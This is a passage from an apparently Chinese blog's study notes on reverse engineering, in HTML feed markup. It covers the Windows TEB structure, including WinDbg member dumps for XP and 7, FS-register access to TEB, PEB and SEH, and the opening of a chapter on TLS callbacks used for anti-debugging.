class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs c">nt!_TEB<br>   +<span class="hljs-number">0x000</span> NtTib            : _NT_TIB<br>   +<span class="hljs-number">0x01c</span> EnvironmentPointer : Ptr32 Void<br>   +<span class="hljs-number">0x020</span> ClientId         : _CLIENT_ID<br>   +<span class="hljs-number">0x028</span> ActiveRpcHandle  : Ptr32 Void<br>   +<span class="hljs-number">0x02c</span> ThreadLocalStoragePointer : Ptr32 Void<br>   +<span class="hljs-number">0x030</span> ProcessEnvironmentBlock : Ptr32 _PEB<br>   +<span class="hljs-number">0x034</span> LastErrorValue   : Uint4B<br>   +<span class="hljs-number">0x038</span> CountOfOwnedCriticalSections : Uint4B<br>   +<span class="hljs-number">0x03c</span> CsrClientThread  : Ptr32 Void<br>   +<span class="hljs-number">0x040</span> Win32ThreadInfo  : Ptr32 Void<br>   +<span class="hljs-number">0x044</span> User32Reserved   : [<span class="hljs-number">26</span>] Uint4B<br>   +<span class="hljs-number">0x0ac</span> UserReserved     : [<span class="hljs-number">5</span>] Uint4B<br>   +<span class="hljs-number">0x0c0</span> WOW32Reserved    : Ptr32 Void<br>   +<span class="hljs-number">0x0c4</span> CurrentLocale    : Uint4B<br>   +<span class="hljs-number">0x0c8</span> FpSoftwareStatusRegister : Uint4B<br>   +<span class="hljs-number">0x0cc</span> SystemReserved1  : [<span class="hljs-number">54</span>] Ptr32 Void<br>   +<span class="hljs-number">0x1a4</span> ExceptionCode    : Int4B<br>   +<span class="hljs-number">0x1a8</span> ActivationContextStack : _ACTIVATION_CONTEXT_STACK<br>   +<span class="hljs-number">0x1bc</span> SpareBytes1      : [<span class="hljs-number">24</span>] UChar<br>   +<span class="hljs-number">0x1d4</span> GdiTebBatch      : _GDI_TEB_BATCH<br>   +<span class="hljs-number">0x6b4</span> RealClientId     : _CLIENT_ID<br>   +<span class="hljs-number">0x6bc</span> GdiCachedProcessHandle : Ptr32 Void<br>   +<span class="hljs-number">0x6c0</span> GdiClientPID     : Uint4B<br>   +<span class="hljs-number">0x6c4</span> GdiClientTID     : Uint4B<br>   +<span class="hljs-number">0x6c8</span> GdiThreadLocalInfo : Ptr32 Void<br>   +<span class="hljs-number">0x6cc</span> Win32ClientInfo  : [<span class="hljs-number">62</span>] Uint4B<br>   +<span class="hljs-number">0x7c4</span> glDispatchTable  : [<span class="hljs-number">233</span>] Ptr32 Void<br>   +<span class="hljs-number">0xb68</span> glReserved1      : [<span class="hljs-number">29</span>] Uint4B<br>   +<span class="hljs-number">0xbdc</span> glReserved2      : Ptr32 Void<br>   +<span class="hljs-number">0xbe0</span> glSectionInfo    : Ptr32 Void<br>   +<span class="hljs-number">0xbe4</span> glSection        : Ptr32 Void<br>   +<span class="hljs-number">0xbe8</span> glTable          : Ptr32 Void<br>   +<span class="hljs-number">0xbec</span> glCurrentRC      : Ptr32 Void<br>   +<span class="hljs-number">0xbf0</span> glContext        : Ptr32 Void<br>   +<span class="hljs-number">0xbf4</span> LastStatusValue  : Uint4B<br>   +<span class="hljs-number">0xbf8</span> StaticUnicodeString : _UNICODE_STRING<br>   +<span class="hljs-number">0xc00</span> StaticUnicodeBuffer : [<span class="hljs-number">261</span>] Uint2B<br>   +<span class="hljs-number">0xe0c</span> DeallocationStack : Ptr32 Void<br>   +<span class="hljs-number">0xe10</span> TlsSlots         : [<span class="hljs-number">64</span>] Ptr32 Void<br>   +<span class="hljs-number">0xf10</span> TlsLinks         : _LIST_ENTRY<br>   +<span class="hljs-number">0xf18</span> Vdm              : Ptr32 Void<br>   +<span class="hljs-number">0xf1c</span> ReservedForNtRpc : Ptr32 Void<br>   +<span class="hljs-number">0xf20</span> DbgSsReserved    : [<span class="hljs-number">2</span>] Ptr32 Void<br>   +<span class="hljs-number">0xf28</span> HardErrorsAreDisabled : Uint4B<br>   +<span class="hljs-number">0xf2c</span> Instrumentation  : [<span class="hljs-number">16</span>] Ptr32 Void<br>   +<span class="hljs-number">0xf6c</span> WinSockData      : Ptr32 Void<br>   +<span class="hljs-number">0xf70</span> GdiBatchCount    : Uint4B<br>   +<span class="hljs-number">0xf74</span> InDbgPrint       : UChar<br>   +<span class="hljs-number">0xf75</span> FreeStackOnTermination : UChar<br>   +<span class="hljs-number">0xf76</span> HasFiberData     : UChar<br>   +<span class="hljs-number">0xf77</span> IdealProcessor   : UChar<br>   +<span class="hljs-number">0xf78</span> Spare3           : Uint4B<br>   +<span class="hljs-number">0xf7c</span> ReservedForPerf  : Ptr32 Void<br>   +<span class="hljs-number">0xf80</span> ReservedForOle   : Ptr32 Void<br>   +<span class="hljs-number">0xf84</span> WaitingOnLoaderLock : Uint4B<br>   +<span class="hljs-number">0xf88</span> Wx86Thread       : _Wx86ThreadState<br>   +<span class="hljs-number">0xf94</span> TlsExpansionSlots : Ptr32 Ptr32 Void<br>   +<span class="hljs-number">0xf98</span> ImpersonationLocale : Uint4B<br>   +<span class="hljs-number">0xf9c</span> IsImpersonating  : Uint4B<br>   +<span class="hljs-number">0xfa0</span> NlsCache         : Ptr32 Void<br>   +<span class="hljs-number">0xfa4</span> pShimData        : Ptr32 Void<br>   +<span class="hljs-number">0xfa8</span> HeapVirtualAffinity : Uint4B<br>   +<span class="hljs-number">0xfac</span> CurrentTransactionHandle : Ptr32 Void<br>   +<span class="hljs-number">0xfb0</span> ActiveFrame      : Ptr32 _TEB_ACTIVE_FRAME<br>   +<span class="hljs-number">0xfb4</span> SafeThunkCall    : UChar<br>   +<span class="hljs-number">0xfb5</span> BooleanSpare     : [<span class="hljs-number">3</span>] UChar<br></code></pre></td></tr></table></figure><p><strong>Windows 7中</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs c">dt ntdll!_TEB<br>   +<span class="hljs-number">0x000</span> NtTib            : _NT_TIB<br>   +<span class="hljs-number">0x01c</span> EnvironmentPointer : Ptr32 Void<br>   +<span class="hljs-number">0x020</span> ClientId         : _CLIENT_ID<br>   +<span class="hljs-number">0x028</span> ActiveRpcHandle  : Ptr32 Void<br>   +<span class="hljs-number">0x02c</span> ThreadLocalStoragePointer : Ptr32 Void<br>   +<span class="hljs-number">0x030</span> ProcessEnvironmentBlock : Ptr32 _PEB<br>   +<span class="hljs-number">0x034</span> LastErrorValue   : Uint4B<br>   +<span class="hljs-number">0x038</span> CountOfOwnedCriticalSections : Uint4B<br>   +<span class="hljs-number">0x03c</span> CsrClientThread  : Ptr32 Void<br>   +<span class="hljs-number">0x040</span> Win32ThreadInfo  : Ptr32 Void<br>   +<span class="hljs-number">0x044</span> User32Reserved   : [<span class="hljs-number">26</span>] Uint4B<br>   +<span class="hljs-number">0x0ac</span> UserReserved     : [<span class="hljs-number">5</span>] Uint4B<br>   +<span class="hljs-number">0x0c0</span> WOW32Reserved    : Ptr32 Void<br>   +<span class="hljs-number">0x0c4</span> CurrentLocale    : Uint4B<br>   +<span class="hljs-number">0x0c8</span> FpSoftwareStatusRegister : Uint4B<br>   +<span class="hljs-number">0x0cc</span> SystemReserved1  : [<span class="hljs-number">54</span>] Ptr32 Void<br>   +<span class="hljs-number">0x1a4</span> ExceptionCode    : Int4B<br>   +<span class="hljs-number">0x1a8</span> ActivationContextStackPointer : Ptr32 _ACTIVATION_CONTEXT_STACK<br>   +<span class="hljs-number">0x1ac</span> SpareBytes       : [<span class="hljs-number">36</span>] UChar<br>   +<span class="hljs-number">0x1d0</span> TxFsContext      : Uint4B<br>   +<span class="hljs-number">0x1d4</span> GdiTebBatch      : _GDI_TEB_BATCH<br>   +<span class="hljs-number">0x6b4</span> RealClientId     : _CLIENT_ID<br>   +<span class="hljs-number">0x6bc</span> GdiCachedProcessHandle : Ptr32 Void<br>   +<span class="hljs-number">0x6c0</span> GdiClientPID     : Uint4B<br>   +<span class="hljs-number">0x6c4</span> GdiClientTID     : Uint4B<br>   +<span class="hljs-number">0x6c8</span> GdiThreadLocalInfo : Ptr32 Void<br>   +<span class="hljs-number">0x6cc</span> Win32ClientInfo  : [<span class="hljs-number">62</span>] Uint4B<br>   +<span class="hljs-number">0x7c4</span> glDispatchTable  : [<span class="hljs-number">233</span>] Ptr32 Void<br>   +<span class="hljs-number">0xb68</span> glReserved1      : [<span class="hljs-number">29</span>] Uint4B<br>   +<span class="hljs-number">0xbdc</span> glReserved2      : Ptr32 Void<br>   +<span class="hljs-number">0xbe0</span> glSectionInfo    : Ptr32 Void<br>   +<span class="hljs-number">0xbe4</span> glSection        : Ptr32 Void<br>   +<span class="hljs-number">0xbe8</span> glTable          : Ptr32 Void<br>   +<span class="hljs-number">0xbec</span> glCurrentRC      : Ptr32 Void<br>   +<span class="hljs-number">0xbf0</span> glContext        : Ptr32 Void<br>   +<span class="hljs-number">0xbf4</span> LastStatusValue  : Uint4B<br>   +<span class="hljs-number">0xbf8</span> StaticUnicodeString : _UNICODE_STRING<br>   +<span class="hljs-number">0xc00</span> StaticUnicodeBuffer : [<span class="hljs-number">261</span>] Wchar<br>   +<span class="hljs-number">0xe0c</span> DeallocationStack : Ptr32 Void<br>   +<span class="hljs-number">0xe10</span> TlsSlots         : [<span class="hljs-number">64</span>] Ptr32 Void<br>   +<span class="hljs-number">0xf10</span> TlsLinks         : _LIST_ENTRY<br>   +<span class="hljs-number">0xf18</span> Vdm              : Ptr32 Void<br>   +<span class="hljs-number">0xf1c</span> ReservedForNtRpc : Ptr32 Void<br>   +<span class="hljs-number">0xf20</span> DbgSsReserved    : [<span class="hljs-number">2</span>] Ptr32 Void<br>   +<span class="hljs-number">0xf28</span> HardErrorMode    : Uint4B<br>   +<span class="hljs-number">0xf2c</span> Instrumentation  : [<span class="hljs-number">9</span>] Ptr32 Void<br>   +<span class="hljs-number">0xf50</span> ActivityId       : _GUID<br>   +<span class="hljs-number">0xf60</span> SubProcessTag    : Ptr32 Void<br>   +<span class="hljs-number">0xf64</span> EtwLocalData     : Ptr32 Void<br>   +<span class="hljs-number">0xf68</span> EtwTraceData     : Ptr32 Void<br>   +<span class="hljs-number">0xf6c</span> WinSockData      : Ptr32 Void<br>   +<span class="hljs-number">0xf70</span> GdiBatchCount    : Uint4B<br>   +<span class="hljs-number">0xf74</span> CurrentIdealProcessor : _PROCESSOR_NUMBER<br>   +<span class="hljs-number">0xf74</span> IdealProcessorValue : Uint4B<br>   +<span class="hljs-number">0xf74</span> ReservedPad0     : UChar<br>   +<span class="hljs-number">0xf75</span> ReservedPad1     : UChar<br>   +<span class="hljs-number">0xf76</span> ReservedPad2     : UChar<br>   +<span class="hljs-number">0xf77</span> IdealProcessor   : UChar<br>   +<span class="hljs-number">0xf78</span> GuaranteedStackBytes : Uint4B<br>   +<span class="hljs-number">0xf7c</span> ReservedForPerf  : Ptr32 Void<br>   +<span class="hljs-number">0xf80</span> ReservedForOle   : Ptr32 Void<br>   +<span class="hljs-number">0xf84</span> WaitingOnLoaderLock : Uint4B<br>   +<span class="hljs-number">0xf88</span> SavedPriorityState : Ptr32 Void<br>   +<span class="hljs-number">0xf8c</span> SoftPatchPtr1    : Uint4B<br>   +<span class="hljs-number">0xf90</span> ThreadPoolData   : Ptr32 Void<br>   +<span class="hljs-number">0xf94</span> TlsExpansionSlots : Ptr32 Ptr32 Void<br>   +<span class="hljs-number">0xf98</span> MuiGeneration    : Uint4B<br>   +<span class="hljs-number">0xf9c</span> IsImpersonating  : Uint4B<br>   +<span class="hljs-number">0xfa0</span> NlsCache         : Ptr32 Void<br>   +<span class="hljs-number">0xfa4</span> pShimData        : Ptr32 Void<br>   +<span class="hljs-number">0xfa8</span> HeapVirtualAffinity : Uint4B<br>   +<span class="hljs-number">0xfac</span> CurrentTransactionHandle : Ptr32 Void<br>   +<span class="hljs-number">0xfb0</span> ActiveFrame      : Ptr32 _TEB_ACTIVE_FRAME<br>   +<span class="hljs-number">0xfb4</span> FlsData          : Ptr32 Void<br>   +<span class="hljs-number">0xfb8</span> PreferredLanguages : Ptr32 Void<br>   +<span class="hljs-number">0xfbc</span> UserPrefLanguages : Ptr32 Void<br>   +<span class="hljs-number">0xfc0</span> MergedPrefLanguages : Ptr32 Void<br>   +<span class="hljs-number">0xfc4</span> MuiImpersonation : Uint4B<br>   +<span class="hljs-number">0xfc8</span> CrossTebFlags    : Uint2B<br>   +<span class="hljs-number">0xfc8</span> SpareCrossTebBits : Pos <span class="hljs-number">0</span>, <span class="hljs-number">16</span> Bits<br>   +<span class="hljs-number">0xfca</span> SameTebFlags     : Uint2B<br>   +<span class="hljs-number">0xfca</span> SafeThunkCall    : Pos <span class="hljs-number">0</span>, <span class="hljs-number">1</span> Bit<br>   +<span class="hljs-number">0xfca</span> InDebugPrint     : Pos <span class="hljs-number">1</span>, <span class="hljs-number">1</span> Bit<br>   +<span class="hljs-number">0xfca</span> HasFiberData     : Pos <span class="hljs-number">2</span>, <span class="hljs-number">1</span> Bit<br>   +<span class="hljs-number">0xfca</span> SkipThreadAttach : Pos <span class="hljs-number">3</span>, <span class="hljs-number">1</span> Bit<br>   +<span class="hljs-number">0xfca</span> WerInShipAssertCode : Pos <span class="hljs-number">4</span>, <span class="hljs-number">1</span> Bit<br>   +<span class="hljs-number">0xfca</span> RanProcessInit   : Pos <span class="hljs-number">5</span>, <span class="hljs-number">1</span> Bit<br>   +<span class="hljs-number">0xfca</span> ClonedThread     : Pos <span class="hljs-number">6</span>, <span class="hljs-number">1</span> Bit<br>   +<span class="hljs-number">0xfca</span> SuppressDebugMsg : Pos <span class="hljs-number">7</span>, <span class="hljs-number">1</span> Bit<br>   +<span class="hljs-number">0xfca</span> DisableUserStackWalk : Pos <span class="hljs-number">8</span>, <span class="hljs-number">1</span> Bit<br>   +<span class="hljs-number">0xfca</span> RtlExceptionAttached : Pos <span class="hljs-number">9</span>, <span class="hljs-number">1</span> Bit<br>   +<span class="hljs-number">0xfca</span> InitialThread    : Pos <span class="hljs-number">10</span>, <span class="hljs-number">1</span> Bit<br>   +<span class="hljs-number">0xfca</span> SpareSameTebBits : Pos <span class="hljs-number">11</span>, <span class="hljs-number">5</span> Bits<br>   +<span class="hljs-number">0xfcc</span> TxnScopeEnterCallback : Ptr32 Void<br>   +<span class="hljs-number">0xfd0</span> TxnScopeExitCallback : Ptr32 Void<br>   +<span class="hljs-number">0xfd4</span> TxnScopeContext  : Ptr32 Void<br>   +<span class="hljs-number">0xfd8</span> LockCount        : Uint4B<br>   +<span class="hljs-number">0xfdc</span> SpareUlong0      : Uint4B<br>   +<span class="hljs-number">0xfe0</span> ResourceRetValue : Ptr32 Void<br></code></pre></td></tr></table></figure><p>如上所示，借助WinDbg的符号文件，我们查看了TEB结构体的所有成员。仔细比较代码46-2与46-3可以发现，Windows 7下的TEB结构体比Windows XP下的TEB结构体大。</p><h2 id="46-1-3重要成员"><a href="#46-1-3重要成员" class="headerlink" title="46.1.3重要成员"></a>46.1.3重要成员</h2><p>如上所示，TEB结构体的成员多而复杂，在用户模式调试中起着重要作用的成员有2个，如代码46-4所示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">+<span class="hljs-number">0x000</span> NtTib            : _NT_TIB<br>+<span class="hljs-number">0x030</span> ProcessEnvironmentBlock : Ptr32 _PEB<br></code></pre></td></tr></table></figure><p><strong>ProcessEnvironmentBlock成员</strong></p><p>先看Offset 30处的ProcessEnvironmentBlock成员，它是指向PEB（Process Environment Block，进程环境块）结构体的指针。PEB是进程环境块，每个进程对应1个PEB结构体，下一章将详细讲解。</p><p><strong>NtTib成员</strong></p><p>TEB结构体的第一个成员S_NT_TIB结构体（TIB是Thread Information Block的简称，意为“线程信息块”），_NT_TIB结构体的定义如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">NT_TIB</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">EXCEPTION_REGISTRATION_RECORD</span> *<span class="hljs-title">ExceptionList</span>;</span><br>    PVOID StackBase;<br>    PVOID StackLimit;<br>    PVOID SubSystemTib;<br>    PVOID ArbitraryUserPointer;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">NT_TIB</span> *<span class="hljs-title">Self</span>;</span><br>&#125; NT_TIB;<br><span class="hljs-keyword">typedef</span> NT_TIB *PNT_TIB;<br></code></pre></td></tr></table></figure><p>ExceptionList成员指向_EXCEPTION_REGISTRATION_RECORD结构体组成的链表，它用于Windows OS的SEH。Self成员是_NT_TIB结构体的自引用指针，也是TEB结构体的指针（因为TEB结构体的第一个成员就是_NT_TIB结构体）。那么接下来的问题是，该如何在用户模式下访问TEB结构体呢？只有访问它才能使用相应信息。下一节将学习如何在用户模式下访问TEB结构体。</p><h1 id="46-2-TEB访问方法"><a href="#46-2-TEB访问方法" class="headerlink" title="46.2 TEB访问方法"></a>46.2 TEB访问方法</h1><p>前面讲解过，借助WinDbg内核调试器可以很容易地访问TEB结构体。那么，该如何在用户模式下访问它呢？答案就是，通过OS提供的相关API访问。</p><blockquote><p>请注意：下面示例中出现的地址会随用户计算机环境的不同而不同。</p></blockquote><h2 id="46-2-1-Ntdll-NtCurrentTeb"><a href="#46-2-1-Ntdll-NtCurrentTeb" class="headerlink" title="46.2.1 Ntdll.NtCurrentTeb()"></a>46.2.1 Ntdll.NtCurrentTeb()</h2><p>Ntdll.NtCurrentTeb() API用来返回当前线程的TEB结构体的地址。该函数内部是如何实现的呢？下面使用OllyDbg工具查看。首先在OllyDbg中打开Notepad.exe程序（也可以打开其他任一程序），然后在鼠标右键菜单中选择Search for Name in all modules菜单，在Name in all modules对话框中查找ntdll.NtCurrentTeb()API,如图46-1所示（单击Name栏，按Name排序后更易查找）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC46%E7%AB%A0%20TEB.assets/image-20220320213813296.png#alt=image-20220320213813296"></p><p>如图46-1所示，查找到NtCurrentTeb函数后，使用鼠标双击即可跳转到该API的代码处，如图46-2所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC46%E7%AB%A0%20TEB.assets/image-20220320214004834.png#alt=image-20220320214004834"></p><p>从上图可以看到，NtCurrentTeb()函数的内部代码非常简单，只返回FS:[18]地址值。在图46-2 的OllyDbg的代码注释窗口中可以看到FS:[18]的实际地址为7FFDF018。在内存窗口中进入7FFDF018地址，发现其值为7FFDF000，即NtCurrentTeb() API返回7FFDF000,该地址就是当前线程的TEB的地址。仔细观察图46-2中TEB结构体的地址（7FFDF000）,发现它与FS段寄存器所指的段内存的基址是一样的。也就是说，TEB与FS段寄存器有着某种关联。</p><h2 id="46-2-2-FS段寄存器"><a href="#46-2-2-FS段寄存器" class="headerlink" title="46.2.2 FS段寄存器"></a>46.2.2 FS段寄存器</h2><p><strong>SDT（Segment Descriptor Table，段描述符表）</strong></p><p>其实，FS段寄存器用来指示当前线程的TEB结构体。</p><p>IA-32系统中进程的虚拟内存大小为4GB，因而需要32位的指针才能访问整个内存空间。但 是FS寄存器的大小只有16位，那么它如何表示进程内存空间中的TEB结构体的地址呢？实际上，FS寄存器并非直接指向TEB结构体的地址，它持有SDT的索引，而该索引持有实际TEB地址。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC46%E7%AB%A0%20TEB.assets/image-20220320231533622.png#alt=image-20220320231533622"></p><blockquote><p>SDT位于内核内存区域，其地址存储在特殊的寄存器GDTR（Global Descriptor Table Resiger,全局描述符表寄存器）中</p></blockquote><p>借助示意图描述上述过程，如图46-3所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC46%E7%AB%A0%20TEB.assets/image-20220320221305348.png#alt=image-20220320221305348"></p><p>由于段寄存器实际存储的是SDT的索引，所以它也被称为“段选择符”（Segment Selector）。从图46-3中可以看到，TEB结构体位于FS段选择符所指的段内存的起始地址（base address）处。</p><ul><li>FS:[0x18]&#x3D;TEB起始地址</li></ul><p>如果掌握了上述内容，那么就很容易理解下面公式的含义。</p><p>FS:[0x18] &#x3D; TEB.NtTib.Self &#x3D; address of TIB &#x3D; address of TEB &#x3D; <strong>FS:0</strong> &#x3D; 7FFDF000</p><p>FS:0是段内存的起始地址，FS寄存器指向（Indexing） 一个段描述符，而该描述符又指向段内存的起始地址。</p><p>从图46-2中可知，FS:[0x18]与[7FFDF018]（→7FFDF000）具有相同含义。由代码46-5中的_NT_TIB结构体的定义得知，结构体的最后一个Self成员恰好位于从TEB结构体偏移018的位置（再次提醒TEB结构体的第一个成员就是_NT_TIB结构体）。Self指针变量指向偏移018的起始地址，也就是TEB的起始地址。</p><ul><li>FS:[0x30]&#x3D;PEB起始地址</li></ul><p>根据代码46-2与代码46-3，FS:[0x30]可表示为如下等式：</p><p>FS:[0x30] &#x3D; TEB.ProcessEnvironmentBlock &#x3D; address of PEB</p><p>从图46-2中可以知道，FS:[0x30]与[7FFDF030]（→7FFD3000）具有相同含义。也就是说，通过TEB的ProcessEnvironment Block成员可以获取PEB结构体的起始地址。PEB结构体多用于反调试，下一章将详细讲解。</p><ul><li>FS:[0]&#x3D;SEH起始地址</li></ul><p>此外还要了解一下FS:[0]。</p><p>FS:[0] &#x3D; TEB.NtTib.ExceptionList &#x3D; address of SEH</p><p>从图46-2中可以知道，FS:[0]与[7FFDF000]（→1DFF64）具有相同含义。</p><p>SEH是Wiondows操作系统中的结构化异常处理机制，常用于反调试技术，详细内容请参考第48章。</p><h1 id="46-3小结"><a href="#46-3小结" class="headerlink" title="46.3小结"></a>46.3小结</h1><p>本章我们学习了FS:[0]、FS:[0xl8]、FS:[0x30]的含义，调试中会经常见到。只要理解了“FS:[0xl8]指向TEB结构体的起始地址”，就能轻松掌握它们表示的含义。为便于说明，本章并未做复杂讲解，大家具备了一定的水平与实力后；我们会另外学习IA-32内存模型的知识。刚开始学习时虽然有些枯燥乏味，但还是要先认真整理这些相关概念，随着各位对IA-32 CPU与Windows OS理解的逐渐深人，再逐步学习更高级的代码逆向分析技术。</p>]]></content>
    
    
    <categories>
      
      <category>Binary</category>
      
      <category>逆向工程核心原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Binary</tag>
      
      <tag>逆向工程核心原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第45章 TLS回调函数</title>
    <link href="/1999/04/05/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC45%E7%AB%A0%20TLS%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0/"/>
    <url>/1999/04/05/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC45%E7%AB%A0%20TLS%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<p>第45章TLS回调函数</p><p>代码逆向分析领域中，TLS（Thread Local Storage，线程局部存储）回调函数（Callback Function）常用于反调试，本章将学习TLS回调函数的相关知识。TLS回调函数的调用运行要先于EP代码的执行，该特征使它可以作为一种反调试技术使用。下面通过练习示例来了解有关TLS回调函数的内容。</p><blockquote><p>所有练习示例在Windows XP &amp; 7（32位）中通过测试。</p></blockquote><h1 id="45-1-练习-1-HelloTls-exe"><a href="#45-1-练习-1-HelloTls-exe" class="headerlink" title="45.1 练习 #1: HelloTls.exe"></a>45.1 练习 #1: HelloTls.exe</h1><p>运行练习程序文件（HelloTls.exe），弹出一个消息框，单击“确定”按钮后，程序终止运行，如图45-1所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC45%E7%AB%A0%20TLS%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0.assets/image-20220319195832389.png#alt=image-20220319195832389"></p><p>下面使用OllyDbg调试练习示例程序。在OllyDbg调试器中打开并运行HelloTls.exe文件，弹岀如图45-2所示的消息对话框。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC45%E7%AB%A0%20TLS%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0.assets/image-20220319200041204.png#alt=image-20220319200041204"></p><p>如图45-2所示，消息对话框中显示的内容与程序正常运行时显示的内容不同。单击“确定”按钮HelloTls.exe进程随即终止，如图45-3所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC45%E7%AB%A0%20TLS%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0.assets/image-20220319200207182.png#alt=image-20220319200207182"></p><p>正常运行与调试运行中出现不同行为的原因在于，程序运行EP代码前先调用了TLS回调函数，而该回调函数中含有反调试代码，使程序在被调试时弹出“DebuggerDetected!”消息对话框。如果不理解这一原理，调试将无法继续。以上练习示例虽然简单，但却很好地描述了TLS回调函 数的行为特征。接下来讲TLS与TLS回调函数的相关知识，学习其工作原理。</p><h1 id="45-2-TLS"><a href="#45-2-TLS" class="headerlink" title="45.2 TLS"></a>45.2 TLS</h1><p>讲解TLS回调函数前，先简单了解一下有关TLS的知识。TLS是各线程的独立的数据存储空间。使用TLS技术可在线程内部独立使用或修改进程的全局数据或静态数据，就像对待自身的局部变量一样（编程中这种功能非常有用）。</p><blockquote><p>关于TLS更详细的介绍请参考以下网址：</p></blockquote><p><a href="http://msdn.microsoft.com/en-us/library/ms686749(VS.85).aspx">http://msdn.microsoft.com/en-us/library/ms686749(VS.85).aspx</a></p><h2 id="45-2-1-IMAGE-DATA-DIRECTORY-9"><a href="#45-2-1-IMAGE-DATA-DIRECTORY-9" class="headerlink" title="45.2.1 IMAGE_DATA_DIRECTORY[9]"></a>45.2.1 IMAGE_DATA_DIRECTORY[9]</h2><p>若在编程中启用了TLS功能，PE头文件中就会设置TLS表（TLS 